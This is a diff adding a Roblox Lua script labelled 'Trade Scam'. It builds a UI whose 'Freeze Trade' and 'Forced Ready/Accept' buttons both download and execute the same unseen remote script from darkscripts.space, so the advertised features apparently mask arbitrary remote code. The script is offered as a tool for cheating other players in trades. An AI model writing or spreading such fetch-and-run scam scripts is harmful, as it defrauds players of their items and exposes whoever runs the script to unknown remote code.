@@ -1,0 +1,37 @@
+-- Load the Orion Library
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+-- Create a window
+local Window = OrionLib:MakeWindow({
+    Name = "Scriptarg Trade Scam",
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "OrionHubConfig"
+})
+
+-- Create a tab
+local Tab = Window:MakeTab({
+    Name = "Main",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Define the script to execute
+local function executeScript()
+    loadstring(game:HttpGet('https://darkscripts.space/scripts/e2f000f7-c01a-4ae8-b107-4d030c4a8276_1263197110149316610.lua', true))()
+end
+
+-- Add a button: Freeze Trade
+Tab:AddButton({
+    Name = "Freeze Trade",
+    Callback = executeScript
+})
+
+-- Add a button: Forced Ready/Accept
+Tab:AddButton({
+    Name = "Forced Ready/Accept",
+    Callback = executeScript
+})
+
+-- Initialize the interface
+OrionLib:Init()
